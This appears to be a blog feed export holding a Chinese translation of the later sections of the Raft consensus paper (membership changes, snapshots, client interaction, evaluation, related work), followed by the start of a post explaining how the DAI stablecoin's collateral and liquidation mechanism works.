集群成员变化到目前为止，我们都假设集群的配置（加入到一致性算法的服务器集合）是固定不变的。但是在实践中，偶尔是会改变集群的配置的，例如替换那些宕机的机器或者改变复制级别。尽管可以通过暂停整个集群，更新所有配置，然后重启整个集群的方式来实现，但是在更改的时候集群会不可用。另外，如果存在手工操作步骤，那么就会有操作失误的风险。为了避免这样的问题，我们决定自动化配置改变并且将其纳入到 Raft 一致性算法中来。 为了让配置修改机制能够安全，那么在转换的过程中不能够存在任何时间点使得两个领导人同时被选举成功在同一个任期里。不幸的是，任何服务器直接从旧的配置直接转换到新的配置的方案都是不安全的。一次性自动的转换所有服务器是不可能的，所以在转换期间整个集群存在划分成两个独立的大多数群体的可能性（见图 10）。 图 10：直接从一种配置转到新的配置是十分不安全的，因为各个机器可能在任何的时候进行转换。在这个例子中，集群配额从 3 台机器变成了 5 台。不幸的是，存在这样的一个时间点，两个不同的领导人在同一个任期里都可以被选举成功。一个是通过旧的配置，一个通过新的配置。 为了保证安全性，配置更改必须使用两阶段方法。目前有很多种两阶段的实现。例如，有些系统在第一阶段停掉旧的配置所以集群就不能处理客户端请求；然后在第二阶段在启用新的配置。在 Raft 中，集群先切换到一个过渡的配置，我们称之为共同一致；一旦共同一致已经被提交了，那么系统就切换到新的配置上。共同一致是老配置和新配置的结合： 日志条目被复制给集群中新、老配置的所有服务器。 新、旧配置的服务器都可以成为领导人。 达成一致（针对选举和提交）需要分别在两种配置上获得大多数的支持。 共同一致允许独立的服务器在不影响安全性的前提下，在不同的时间进行配置转换过程。此外，共同一致可以让集群在配置转换的过程人依然响应客户端的请求。 集群配置在复制日志中以特殊的日志条目来存储和通信；图 11 展示了配置转换的过程。当一个领导人接收到一个改变配置从 C-old 到 C-new 的请求，他会为了共同一致存储配置（图中的 C-old,new），以前面描述的日志条目和副本的形式。一旦一个服务器将新的配置日志条目增加到它的日志中，他就会用这个配置来做出未来所有的决定（服务器总是使用最新的配置，无论他是否已经被提交）。这意味着领导人要使用 C-old,new 的规则来决定日志条目 C-old,new 什么时候需要被提交。如果领导人崩溃了，被选出来的新领导人可能是使用 C-old 配置也可能是 C-old,new 配置，这取决于赢得选举的候选人是否已经接收到了 C-old,new 配置。在任何情况下， C-new 配置在这一时期都不会单方面的做出决定。 一旦 C-old,new 被提交，那么无论是 C-old 还是 C-new，在没有经过他人批准的情况下都不可能做出决定，并且领导人完全特性保证了只有拥有 C-old,new 日志条目的服务器才有可能被选举为领导人。这个时候，领导人创建一条关于 C-new 配置的日志条目并复制给集群就是安全的了。再者，每个服务器在见到新的配置的时候就会立即生效。当新的配置在 C-new 的规则下被提交，旧的配置就变得无关紧要，同时不使用新的配置的服务器就可以被关闭了。如图 11，C-old 和 C-new 没有任何机会同时做出单方面的决定；这保证了安全性。 图 11：一个配置切换的时间线。虚线表示已经被创建但是还没有被提交的条目，实线表示最后被提交的日志条目。领导人首先创建了 C-old,new 的配置条目在自己的日志中，并提交到 C-old,new 中（C-old 的大多数和 C-new 的大多数）。然后他创建 C-new 条目并提交到 C-new 中的大多数。这样就不存在 C-new 和 C-old 可以同时做出决定的时间点。 在关于重新配置还有三个问题需要提出。第一个问题是，新的服务器可能初始化没有存储任何的日志条目。当这些服务器以这种状态加入到集群中，那么他们需要一段时间来更新追赶，这时还不能提交新的日志条目。为了避免这种可用性的间隔时间，Raft 在配置更新的时候使用了一种额外的阶段，在这个阶段，新的服务器以没有投票权身份加入到集群中来（领导人复制日志给他们，但是不考虑他们是大多数）。一旦新的服务器追赶上了集群中的其他机器，重新配置可以像上面描述的一样处理。 第二个问题是，集群的领导人可能不是新配置的一员。在这种情况下，领导人就会在提交了 C-new 日志之后退位（回到跟随者状态）。这意味着有这样的一段时间，领导人管理着集群，但是不包括他自己；他复制日志但是不把他自己算作是大多数之一。当 C-new 被提交时，会发生领导人过渡，因为这时是最早新的配置可以独立工作的时间点（将总是能够在 C-new 配置下选出新的领导人）。在此之前，可能只能从 C-old 中选出领导人。 第三个问题是，移除不在 C-new 中的服务器可能会扰乱集群。这些服务器将不会再接收到心跳，所以当选举超时，他们就会进行新的选举过程。他们会发送拥有新的任期号的请求投票 RPCs，这样会导致当前的领导人回退成跟随者状态。新的领导人最终会被选出来，但是被移除的服务器将会再次超时，然后这个过程会再次重复，导致整体可用性大幅降低。 为了避免这个问题，当服务器确认当前领导人存在时，服务器会忽略请求投票 RPCs。特别的，当服务器在当前最小选举超时时间内收到一个请求投票 RPC，他不会更新当前的任期号或者投出选票。这不会影响正常的选举，每个服务器在开始一次选举之前，至少等待一个最小选举超时时间。然而，这有利于避免被移除的服务器扰乱：如果领导人能够发送心跳给集群，那么他就不会被更大的任期号废黜。 7 日志压缩Raft 的日志在正常操作中不断的增长，但是在实际的系统中，日志不能无限制的增长。随着日志不断增长，他会占用越来越多的空间，花费越来越多的时间来重置。如果没有一定的机制去清除日志里积累的陈旧的信息，那么会带来可用性问题。 快照是最简单的压缩方法。在快照系统中，整个系统的状态都以快照的形式写入到稳定的持久化存储中，然后到那个时间点之前的日志全部丢弃。快照技术被使用在 Chubby 和 ZooKeeper 中，接下来的章节会介绍 Raft 中的快照技术。 增量压缩的方法，例如日志清理或者日志结构合并树，都是可行的。这些方法每次只对一小部分数据进行操作，这样就分散了压缩的负载压力。首先，他们先选择一个已经积累的大量已经被删除或者被覆盖对象的区域，然后重写那个区域还活跃的对象，之后释放那个区域。和简单操作整个数据集合的快照相比，需要增加复杂的机制来实现。状态机可以实现 LSM tree 使用和快照相同的接口，但是日志清除方法就需要修改 Raft 了。 图 12：一个服务器用新的快照替换了从 1 到 5 的条目，快照值存储了当前的状态。快照中包含了最后的索引位置和任期号。 图 12 展示了 Raft 中快照的基础思想。每个服务器独立的创建快照，只包括已经被提交的日志。主要的工作包括将状态机的状态写入到快照中。Raft 也包含一些少量的元数据到快照中：最后被包含索引指的是被快照取代的最后的条目在日志中的索引值（状态机最后应用的日志），最后被包含的任期指的是该条目的任期号。保留这些数据是为了支持快照后紧接着的第一个条目的附加日志请求时的一致性检查，因为这个条目需要前一日志条目的索引值和任期号。为了支持集群成员更新（第 6 节），快照中也将最后的一次配置作为最后一个条目存下来。一旦服务器完成一次快照，他就可以删除最后索引位置之前的所有日志和快照了。 尽管通常服务器都是独立的创建快照，但是领导人必须偶尔的发送快照给一些落后的跟随者。这通常发生在当领导人已经丢弃了下一条需要发送给跟随者的日志条目的时候。幸运的是这种情况不是常规操作：一个与领导人保持同步的跟随者通常都会有这个条目。然而一个运行非常缓慢的跟随者或者新加入集群的服务器（第 6 节）将不会有这个条目。这时让这个跟随者更新到最新的状态的方式就是通过网络把快照发送给他们。 安装快照 RPC： 由领导人调用以将快照的分块发送给跟随者。领导者总是按顺序发送分块。 参数 解释 term 领导人的任期号 leaderId 领导人的 Id，以便于跟随者重定向请求 lastIncludedIndex 快照中包含的最后日志条目的索引值 lastIncludedTerm 快照中包含的最后日志条目的任期号 offset 分块在快照中的字节偏移量 data[] 原始数据 done 如果这是最后一个分块则为 true 结果 解释 term 当前任期号（currentTerm），便于领导人更新自己 接收者实现： 如果term &lt; currentTerm就立即回复 如果是第一个分块（offset 为 0）就创建一个新的快照 在指定偏移量写入数据 如果 done 是 false，则继续等待更多的数据 保存快照文件，丢弃具有较小索引的任何现有或部分快照 如果现存的日志条目与快照中最后包含的日志条目具有相同的索引值和任期号，则保留其后的日志条目并进行回复 丢弃整个日志 使用快照重置状态机（并加载快照的集群配置） 图 13：一个关于安装快照的简要概述。为了便于传输，快照都是被分成分块的；每个分块都给了跟随者生命的迹象，所以跟随者可以重置选举超时计时器。 在这种情况下领导人使用一种叫做安装快照的新的 RPC 来发送快照给太落后的跟随者；见图 13。当跟随者通过这种 RPC 接收到快照时，他必须自己决定对于已经存在的日志该如何处理。通常快照会包含没有在接收者日志中存在的信息。在这种情况下，跟随者丢弃其整个日志；它全部被快照取代，并且可能包含与快照冲突的未提交条目。如果接收到的快照是自己日志的前面部分（由于网络重传或者错误），那么被快照包含的条目将会被全部删除，但是快照后面的条目仍然有效，必须保留。 这种快照的方式背离了 Raft 的强领导人原则，因为跟随者可以在不知道领导人情况下创建快照。但是我们认为这种背离是值得的。领导人的存在，是为了解决在达成一致性的时候的冲突，但是在创建快照的时候，一致性已经达成，这时不存在冲突了，所以没有领导人也是可以的。数据依然是从领导人传给跟随者，只是跟随者可以重新组织他们的数据了。 我们考虑过一种替代的基于领导人的快照方案，即只有领导人创建快照，然后发送给所有的跟随者。但是这样做有两个缺点。第一，发送快照会浪费网络带宽并且延缓了快照处理的时间。每个跟随者都已经拥有了所有产生快照需要的信息，而且很显然，自己从本地的状态中创建快照比通过网络接收别人发来的要经济。第二，领导人的实现会更加复杂。例如，领导人需要发送快照的同时并行的将新的日志条目发送给跟随者，这样才不会阻塞新的客户端请求。 还有两个问题影响了快照的性能。首先，服务器必须决定什么时候应该创建快照。如果快照创建的过于频繁，那么就会浪费大量的磁盘带宽和其他资源；如果创建快照频率太低，他就要承受耗尽存储容量的风险，同时也增加了从日志重建的时间。一个简单的策略就是当日志大小达到一个固定大小的时候就创建一次快照。如果这个阈值设置的显著大于期望的快照的大小，那么快照对磁盘压力的影响就会很小了。 第二个影响性能的问题就是写入快照需要花费显著的一段时间，并且我们还不希望影响到正常操作。解决方案是通过写时复制的技术，这样新的更新就可以被接收而不影响到快照。例如，具有函数式数据结构的状态机天然支持这样的功能。另外，操作系统的写时复制技术的支持（如 Linux 上的 fork）可以被用来创建完整的状态机的内存快照（我们的实现就是这样的）。 8 客户端交互这一节将介绍客户端是如何和 Raft 进行交互的，包括客户端如何发现领导人和 Raft 是如何支持线性化语义的。这些问题对于所有基于一致性的系统都存在，并且 Raft 的解决方案和其他的也差不多。 Raft 中的客户端发送所有请求给领导人。当客户端启动的时候，他会随机挑选一个服务器进行通信。如果客户端第一次挑选的服务器不是领导人，那么那个服务器会拒绝客户端的请求并且提供他最近接收到的领导人的信息（附加条目请求包含了领导人的网络地址）。如果领导人已经崩溃了，那么客户端的请求就会超时；客户端之后会再次重试随机挑选服务器的过程。 我们 Raft 的目标是要实现线性化语义（每一次操作立即执行，只执行一次，在他调用和收到回复之间）。但是，如上述，Raft 是可以执行同一条命令多次的：例如，如果领导人在提交了这条日志之后，但是在响应客户端之前崩溃了，那么客户端会和新的领导人重试这条指令，导致这条命令就被再次执行了。解决方案就是客户端对于每一条指令都赋予一个唯一的序列号。然后，状态机跟踪每条指令最新的序列号和相应的响应。如果接收到一条指令，它的序列号已经被执行了，那么就立即返回结果，而不重新执行指令。 只读的操作可以直接处理而不需要记录日志。但是，在不增加任何限制的情况下，这么做可能会冒着返回脏数据的风险，因为领导人响应客户端请求时可能已经被新的领导人作废了，但是他还不知道。线性化的读操作必须不能返回脏数据，Raft 需要使用两个额外的措施在不使用日志的情况下保证这一点。首先，领导人必须有关于被提交日志的最新信息。领导人完全特性保证了领导人一定拥有所有已经被提交的日志条目，但是在他任期开始的时候，他可能不知道那些是已经被提交的。为了知道这些信息，他需要在他的任期里提交一条日志条目。Raft 中通过领导人在任期开始的时候提交一个空白的没有任何操作的日志条目到日志中去来实现。第二，领导人在处理只读的请求之前必须检查自己是否已经被废黜了（他自己的信息已经变脏了如果一个更新的领导人被选举出来）。Raft 中通过让领导人在响应只读请求之前，先和集群中的大多数节点交换一次心跳信息来处理这个问题。可选的，领导人可以依赖心跳机制来实现一种租约的机制，但是这种方法依赖时间来保证安全性（假设时间误差是有界的）。 9 算法实现和评估我们已经为 RAMCloud 实现了 Raft 算法作为存储配置信息的复制状态机的一部分，并且帮助 RAMCloud 协调故障转移。这个 Raft 实现包含大约 2000 行 C++ 代码，其中不包括测试、注释和空行。这些代码是开源的。同时也有大约 25 个其他独立的第三方的基于这篇论文草稿的开源实现，针对不同的开发场景。同时，很多公司已经部署了基于 Raft 的系统。 这一节会从三个方面来评估 Raft 算法：可理解性、正确性和性能。 9.1 可理解性为了和 Paxos 比较 Raft 算法的可理解能力，我们针对高层次的本科生和研究生，在斯坦福大学的高级操作系统课程和加州大学伯克利分校的分布式计算课程上，进行了一次学习的实验。我们分别拍了针对 Raft 和 Paxos 的视频课程，并准备了相应的小测验。Raft 的视频讲课覆盖了这篇论文的所有内容除了日志压缩；Paxos 讲课包含了足够的资料来创建一个等价的复制状态机，包括单决策 Paxos，多决策 Paxos，重新配置和一些实际系统需要的性能优化（例如领导人选举）。小测验测试一些对算法的基本理解和解释一些边角的示例。每个学生都是看完第一个视频，回答相应的测试，再看第二个视频，回答相应的测试。大约有一半的学生先进行 Paxos 部分，然后另一半先进行 Raft 部分，这是为了说明两者从第一部分的算法学习中获得的表现和经验的差异。我们计算参加人员的每一个小测验的得分来看参与者是否在 Raft 算法上更加容易理解。 我们尽可能的使得 Paxos 和 Raft 的比较更加公平。这个实验偏爱 Paxos 表现在两个方面：43 个参加者中有 15 个人在之前有一些 Paxos 的经验，并且 Paxos 的视频要长 14%。如表格 1 总结的那样，我们采取了一些措施来减轻这种潜在的偏见。我们所有的材料都可供审查。 关心 缓和偏见采取的手段 可供查看的材料 相同的讲课质量 两者使用同一个讲师。Paxos 使用的是现在很多大学里经常使用的。Paxos 会长 14%。 视频 相同的测验难度 问题以难度分组，在两个测验里成对出现。 小测验 公平评分 使用评价量规。随机顺序打分，两个测验交替进行。 评价量规（rubric） 表 1：考虑到可能会存在的偏见，对于每种情况的解决方法，和相应的材料。 参加者平均在 Raft 的测验中比 Paxos 高 4.9 分（总分 60，那么 Raft 的平均得分是 25.7，而 Paxos 是 20.8）；图 14 展示了每个参与者的得分。配置t-检验（又称student‘s t-test）表明，在 95% 的可信度下，真实的 Raft 分数分布至少比 Paxos 高 2.5 分。 图 14：一个散点图表示了 43 个学生在 Paxos 和 Raft 的小测验中的成绩。在对角线之上的点表示在 Raft 获得了更高分数的学生。 我们也建立了一个线性回归模型来预测一个新的学生的测验成绩，基于以下三个因素：他们使用的是哪个小测验，之前对 Paxos 的经验，和学习算法的顺序。模型预测，对小测验的选择会产生 12.5 分的差别。这显著的高于之前的 4.9 分，因为很多学生在之前都已经有了对于 Paxos 的经验，这相当明显的帮助 Paxos，对 Raft 就没什么太大影响了。但是奇怪的是，模型预测对于先进行 Paxos 小测验的人而言，Raft的得分低了6.3分; 虽然我们不知道为什么，这似乎在统计上是有意义的。 我们同时也在测验之后调查了参与者，他们认为哪个算法更加容易实现和解释；这个的结果在图 15 上。压倒性的结果表明 Raft 算法更加容易实现和解释（41 人中的 33个）。但是，这种自己报告的结果不如参与者的成绩更加可信，并且参与者可能因为我们的 Raft 更加易于理解的假说而产生偏见。 图 15：通过一个 5 分制的问题，参与者（左边）被问哪个算法他们觉得在一个高效正确的系统里更容易实现，右边被问哪个更容易向学生解释。 关于 Raft 用户学习有一个更加详细的讨论。 9.2 正确性在第 5 节，我们已经制定了正式的规范，和对一致性机制的安全性证明。这个正式规范使用 TLA+ 规范语言使图 2 中总结的信息非常清晰。它长约400行，并作为证明的主题。同时对于任何想实现 Raft 的人也是十分有用的。我们通过 TLA 证明系统非常机械的证明了日志完全特性。然而，这个证明依赖的约束前提还没有被机械证明（例如，我们还没有证明规范的类型安全）。而且，我们已经写了一个非正式的证明关于状态机安全性是完备的，并且是相当清晰的（大约 3500 个词）。 9.3 性能Raft 和其他一致性算法例如 Paxos 有着差不多的性能。在性能方面，最重要的关注点是，当领导人被选举成功时，什么时候复制新的日志条目。Raft 通过很少数量的消息包（一轮从领导人到集群大多数机器的消息）就达成了这个目的。同时，进一步提升 Raft 的性能也是可行的。例如，很容易通过支持批量操作和管道操作来提高吞吐量和降低延迟。对于其他一致性算法已经提出过很多性能优化方案；其中有很多也可以应用到 Raft 中来，但是我们暂时把这个问题放到未来的工作中去。 我们使用我们自己的 Raft 实现来衡量 Raft 领导人选举的性能并且回答两个问题。首先，领导人选举的过程收敛是否快速？第二，在领导人宕机之后，最小的系统宕机时间是多久？ 图 16：发现并替换一个已经崩溃的领导人的时间。上面的图考察了在选举超时时间上的随机化程度，下面的图考察了最小选举超时时间。每条线代表了 1000 次实验（除了 150-150 毫秒只试了 100 次），和相应的确定的选举超时时间。例如，150-155 毫秒意思是，选举超时时间从这个区间范围内随机选择并确定下来。这个实验在一个拥有 5 个节点的集群上进行，其广播时延大约是 15 毫秒。对于 9 个节点的集群，结果也差不多。 为了衡量领导人选举，我们反复的使一个拥有五个节点的服务器集群的领导人宕机，并计算需要多久才能发现领导人已经宕机并选出一个新的领导人（见图 16）。为了构建一个最坏的场景，在每一的尝试里，服务器都有不同长度的日志，意味着有些候选人是没有成为领导人的资格的。另外，为了促成选票瓜分的情况，我们的测试脚本在终止领导人之前同步的发送了一次心跳广播（这大约和领导人在崩溃前复制一个新的日志给其他机器很像）。领导人均匀的随机的在心跳间隔里宕机，也就是最小选举超时时间的一半。因此，最小宕机时间大约就是最小选举超时时间的一半。 图 16 中上面的图表明，只需要在选举超时时间上使用很少的随机化就可以大大避免选票被瓜分的情况。在没有随机化的情况下，在我们的测试里，选举过程往往都需要花费超过 10 秒钟由于太多的选票瓜分的情况。仅仅增加 5 毫秒的随机化时间，就大大的改善了选举过程，现在平均的宕机时间只有 287 毫秒。增加更多的随机化时间可以大大改善最坏情况：通过增加 50 毫秒的随机化时间，最坏的完成情况（1000 次尝试）只要 513 毫秒。 图 16 中下面的图显示，通过减少选举超时时间可以减少系统的宕机时间。在选举超时时间为 12-24 毫秒的情况下，只需要平均 35 毫秒就可以选举出新的领导人（最长的一次花费了 152 毫秒）。然而，进一步降低选举超时时间的话就会违反 Raft 的时间不等式需求：在选举新领导人之前，领导人就很难发送完心跳包。这会导致没有意义的领导人改变并降低了系统整体的可用性。我们建议使用更为保守的选举超时时间，比如 150-300 毫秒；这样的时间不大可能导致没有意义的领导人改变，而且依然提供不错的可用性。 10 相关工作已经有很多关于一致性算法的工作被发表出来，其中很多都可以归到下面的类别中： Lamport 关于 Paxos 的原始描述，和尝试描述的更清晰。 关于 Paxos 的更详尽的描述，补充遗漏的细节并修改算法，使得可以提供更加容易的实现基础。 实现一致性算法的系统，例如 Chubby，ZooKeeper 和 Spanner。对于 Chubby 和 Spanner 的算法并没有公开发表其技术细节，尽管他们都声称是基于 Paxos 的。ZooKeeper 的算法细节已经发表，但是和 Paxos 着实有着很大的差别。 Paxos 可以应用的性能优化。 Oki 和 Liskov 的 Viewstamped Replication（VR），一种和 Paxos 差不多的替代算法。原始的算法描述和分布式传输协议耦合在了一起，但是核心的一致性算法在最近的更新里被分离了出来。VR 使用了一种基于领导人的方法，和 Raft 有很多相似之处。 Raft 和 Paxos 最大的不同之处就在于 Raft 的强领导特性：Raft 使用领导人选举作为一致性协议里必不可少的部分，并且将尽可能多的功能集中到了领导人身上。这样就可以使得算法更加容易理解。例如，在 Paxos 中，领导人选举和基本的一致性协议是正交的：领导人选举仅仅是性能优化的手段，而且不是一致性所必须要求的。但是，这样就增加了多余的机制：Paxos 同时包含了针对基本一致性要求的两阶段提交协议和针对领导人选举的独立的机制。相比较而言，Raft 就直接将领导人选举纳入到一致性算法中，并作为两阶段一致性的第一步。这样就减少了很多机制。 像 Raft 一样，VR 和 ZooKeeper 也是基于领导人的，因此他们也拥有一些 Raft 的优点。但是，Raft 比 VR 和 ZooKeeper 拥有更少的机制因为 Raft 尽可能的减少了非领导人的功能。例如，Raft 中日志条目都遵循着从领导人发送给其他人这一个方向：附加条目 RPC 是向外发送的。在 VR 中，日志条目的流动是双向的（领导人可以在选举过程中接收日志）；这就导致了额外的机制和复杂性。根据 ZooKeeper 公开的资料看，它的日志条目也是双向传输的，但是它的实现更像 Raft。 和上述我们提及的其他基于一致性的日志复制算法中，Raft 的消息类型更少。例如，我们数了一下 VR 和 ZooKeeper 使用的用来基本一致性需要和成员改变的消息数（排除了日志压缩和客户端交互，因为这些都比较独立且和算法关系不大）。VR 和 ZooKeeper 都分别定义了 10 中不同的消息类型，相对的，Raft 只有 4 中消息类型（两种 RPC 请求和对应的响应）。Raft 的消息都稍微比其他算法的要信息量大，但是都很简单。另外，VR 和 ZooKeeper 都在领导人改变时传输了整个日志；所以为了能够实践中使用，额外的消息类型就很必要了。 Raft 的强领导人模型简化了整个算法，但是同时也排斥了一些性能优化的方法。例如，平等主义 Paxos （EPaxos）在某些没有领导人的情况下可以达到很高的性能。平等主义 Paxos 充分发挥了在状态机指令中的交换性。任何服务器都可以在一轮通信下就提交指令，除非其他指令同时被提出了。然而，如果指令都是并发的被提出，并且互相之间不通信沟通，那么 EPaxos 就需要额外的一轮通信。因为任何服务器都可以提交指令，所以 EPaxos 在服务器之间的负载均衡做的很好，并且很容易在 WAN 网络环境下获得很低的延迟。但是，他在 Paxos 上增加了非常明显的复杂性。 一些集群成员变换的方法已经被提出或者在其他的工作中被实现，包括 Lamport 的原始的讨论，VR 和 SMART。我们选择使用共同一致的方法因为他对一致性协议的其他部分影响很小，这样我们只需要很少的一些机制就可以实现成员变换。Lamport 的基于 α 的方法之所以没有被 Raft 选择是因为它假设在没有领导人的情况下也可以达到一致性。和 VR 和 SMART 相比较，Raft 的重新配置算法可以在不限制正常请求处理的情况下进行；相比较的，VR 需要停止所有的处理过程，SMART 引入了一个和 α 类似的方法，限制了请求处理的数量。Raft 的方法同时也需要更少的额外机制来实现，和 VR、SMART 比较而言。 11 结论算法的设计通常会把正确性，效率或者简洁作为主要的目标。尽管这些都是很有意义的目标，但是我们相信，可理解性也是一样的重要。在开发者把算法应用到实际的系统中之前，这些目标没有一个会被实现，这些都会必然的偏离发表时的形式。除非开发人员对这个算法有着很深的理解并且有着直观的感觉，否则将会对他们而言很难在实现的时候保持原有期望的特性。 在这篇论文中，我们尝试解决分布式一致性问题，但是一个广为接受但是十分令人费解的算法 Paxos 已经困扰了无数学生和开发者很多年了。我们创造了一种新的算法 Raft，显而易见的比 Paxos 要容易理解。我们同时也相信，Raft 也可以为实际的实现提供坚实的基础。把可理解性作为设计的目标改变了我们设计 Raft 的方式；随着设计的进展，我们发现自己重复使用了一些技术，比如分解问题和简化状态空间。这些技术不仅提升了 Raft 的可理解性，同时也使我们坚信其正确性。 12 感谢这项研究必须感谢以下人员的支持：Ali Ghodsi，David Mazie`res，和伯克利 CS 294-91 课程、斯坦福 CS 240 课程的学生。Scott Klemmer 帮我们设计了用户调查，Nelson Ray 建议我们进行统计学的分析。在用户调查时使用的关于 Paxos 的幻灯片很大一部分是从 Lorenzo Alvisi 的幻灯片上借鉴过来的。特别的，非常感谢 DavidMazieres 和 Ezra Hoch，他们找到了 Raft 中一些难以发现的漏洞。许多人提供了关于这篇论文十分有用的反馈和用户调查材料，包括 Ed Bugnion，Michael Chan，Hugues Evrard，Daniel Giffin，Arjun Gopalan，Jon Howell，Vimalkumar Jeyakumar，Ankita Kejriwal，Aleksandar Kracun，Amit Levy，Joel Martin，Satoshi Matsushita，Oleg Pesok，David Ramos，Robbert van Renesse，Mendel Rosenblum，Nicolas Schiper，Deian Stefan，Andrew Stone，Ryan Stutsman，David Terei，Stephen Yang，Matei Zaharia 以及 24 位匿名的会议审查人员（可能有重复），并且特别感谢我们的领导人 Eddie Kohler。Werner Vogels 发了一条早期草稿链接的推特，给 Raft 带来了极大的关注。我们的工作由 Gigascale 系统研究中心和 Multiscale 系统研究中心给予支持，这两个研究中心由关注中心研究程序资金支持，一个是半导体研究公司的程序，由 STARnet 支持，一个半导体研究公司的程序由 MARCO 和 DARPA 支持，在国家科学基金会的 0963859 号批准，并且获得了来自 Facebook，Google，Mellanox，NEC，NetApp，SAP 和 Samsung 的支持。Diego Ongaro 由 Junglee 公司，斯坦福的毕业团体支持。 本文经TopJohn授权转自TopJohn’s Blog 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>共识</category>
      </categories>
      <tags>
        <tag>共识</tag>
        <tag>一致性算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[理解去中心化 稳定币 DAI]]></title>
    <url>%2F2019%2F03%2F19%2Funderstand_dai%2F</url>
    <content type="text"><![CDATA[随着摩根大通推出JPM Coin 稳定币，可以预见稳定币将成为区块链落地的一大助推器。坦白来讲，对于一个程序员的我来讲（不懂一点专业经济和金融），理解DAI的机制，真的有一点复杂。耐心看完，必有收获。 为什么需要稳定币如果一个货币其价值时刻在剧烈波动，就无法作为一个日常支付和交易的货币，谁也无法承担今天发的工资，第二天就跌掉了三分之一。 在币价高度不稳定时，在不退出加密货币市场的情况下，稳定币就可以提供价值保值。 通常发行稳定币的方式是通过资产担保来发行，像USDT、TUSD等就是通过美元资产来担保发行等额稳定币，如银行存款1亿美元就发行1亿USDT， 既通过锚定法币来实行稳定性。 USDT 因审计不公开，经常被质疑超发，如1亿美元担保发行1.5亿USDT，就会导致0.5亿USDT无法兑换美元。这也是为什么在监管下发行的稳定币，如TUSD、GUSD有逐步取代USDT的趋势。 本文的主角 DAI 同样是通过资产抵押发行， DAI 是通过抵押数字资产发行，去中心化发行。 注意加粗的两个关键字抵押数字资产和去中心化，它是用一套称之为Maker的智能合约发行的，其背后的团队为MakerDAO。 Maker目前只支持抵押ETH，后面可能会加入其它代币。DAO (Decentralized Autonomous Organization): 去中心化的自治组织 我们都知道数字资产的价值是有很大波动的， 那么Maker怎么来确保 1 DAI = 1 USD的呢？ 稳定币 DAI的发行Maker体系中有一个实现了抵押贷款逻辑的智能合约（CDP）， 当我们抵押（发送）ETH到智能合约，合约根据当时ETH的价值，计算一个折扣后，发行对应的DAI（符合ERC20标准的代币）。 以太价格获取Maker采用的是中心化方案，从各大交易所获取再加权平均。 为了方便理解，类比抵押屋产贷款，我们把房子作为抵押品向银行贷款，ETH就相当于房子，智能合约相当于银行，DAI 相当于贷款拿到的钱。银行给我们贷款时，银行也会对房子的价值打一个折扣。 这个折扣在Maker系统中称之为抵押率，这是一个很重要的概念，大家务必理解。 我们给他一个数学定义： 抵押率 = 抵押物的价值 / 放贷的价值。 如果房子价值200万，抵押率为200%， 银行就只能给我们贷款100万，这个大家应该能够理解。同样，假设以太币现在价值200美元，抵押率为200％，那么把1个以太币（200美元）发送到CDP智能合约，就可以获得发行的100个DAI。 在抵押ETH生成DAI的同时，合约会为我们生成一张CDP借贷凭证，它记录着借贷关系及金额，并且抵押ETH会一直锁定在合约里，在还清100个DAI时，ETH将归还我们。 就像银行扣押房子直到我们还清贷款一样。 到这里，DAI的发行应该明白了。 套现保值DAI的这种抵押贷款逻辑非常有意思 ，它生成的CDP借贷凭证提供给我们一个套现保值的手段。假如你有一大笔以太在手里， 而你又急需一笔资金怎么办？ 那么抵押生成DAI是获得资金的一个绝佳选择。如果在交易所把币卖掉换成稳定币，会失去以太的所有权，币价上涨时就无法换回对应的以太。 例如：目前 ETH 价格约为 130 美元， 按200%的抵押率， 1000个以太可以抵押生成6.5万个DAI，即可以获得6.5万美元资金，假设一年之后，ETH价格涨到到500 美元，只需要偿还6.5万个DAI（美元）及一点利息就可以赎回1000个以太（价值50万美元）。 DAI是如何保持稳定的？依靠抵押美元发行的USDT、TUSD，能保持价值相对稳定很容易理解，靠抵押ETH的DAI如何保持稳定呢？ 分两种情况：如果 ETH 升值， 意味着 DAI 有更足够的抵押（更高的抵押率，担保更充足），这不会有太大影响。如果DAI的交易价格超过1美元，Maker也会激励用户创造更多的DAI（目标利率反馈机制）。 目标利率反馈机制（TRFM）：不过最重要的是以下几点：当DAI的交易价格超过1美元时，智能合约会激励人们生成DAI。当DAI的交易价格不到1美元时，智能合约会激励人们赎返DAI。 如果 ETH 价值下降则复杂一些，回到抵押屋产贷款的类比，如果我们的房子价值下降，银行会要求我们追加抵押物或及时还款，Maker也是一样，始终要求DAI是超额抵押的。 如果资产下跌到一定值（如抵押率150%），并且原抵押人没有追加抵押物或偿还（部分）DAI，合约会自动启动清算（liquidated），之前抵押的以太币被拍卖，直到从CDP合约借出的DAI被还清。 还是前面的类比，价值200万房子，抵押率200%，贷款了100万，在房子下跌到150万时，银行就会拍卖房子，清除这笔贷款。 Maker也是使用这种方式从市面上回购DAI用来偿还给CDP。 简单总结：Maker始终要求DAI是超额抵押的，当系统发现有部分资产存在风险时，就会对风险过高的资产进行清算，它会首先清算抵押率低于 150% 的CDP借贷凭证，而为了防止清算持有人必须往CDP借贷凭证存入更多ETH或偿还DAI来提高抵押率。 现在我们来看 MakerDao抵押借款的界面就清晰了，以下截图是抵押1 ETH 生成60个DAI： Collateralization ratio 抵押率为 228%， Liquidation price 清算价格为90 美金。 清算关于清算也许还有几点需要了解： 在发生清算后， 就再也无法通过偿还DAI来取回之前抵押的ETH了（CDP借贷凭证会关闭）。 清算发生时，会扣除一部分的罚金（13%的罚金）和手续费。 拍卖ETH得到的DAI 会被销毁， 就像用户偿还DAI 被销毁一样。 拍卖偿还DAI后， 剩余的资产用户可以拿回。 Maker系统中有一个专门负责清算的合约。 MKR 应对暴跌上面一有一个前提，不管如果 DAI 都是超额抵押， 如果以太价格急剧下跌，抵押品的价值达不到借出的DAI的价值时，这时启动清算，将由Mkr持有者负责回购。 Mkr 是Maker系统中的权益代币， Mkr持有者是系统的收益者，获取借款利息及罚金等。 还是前面的类比，如果价值200万房子， 突然跌倒100万以下， 这时候在公开市场拍卖，市场是没有买家出100万以上购买房子的，那么银行将启用自有资金回购。 相当于损失的价值转嫁到Mkr持有者，价格波动是没发消灭的，它只能转移，DAI的价格波动性实际由CDP 借贷凭证持有者和Mkr持有者共同承担。 一点拓展DAI 由于它的超额抵押借款机制，是一个很好的杠杆做多工具。 如果我们预期以太币会上涨，我们可以把前面1000个以太抵押生成6.5万个DAI，再此购买以太进行抵押，多次操作之后，可能获得数倍的增值。 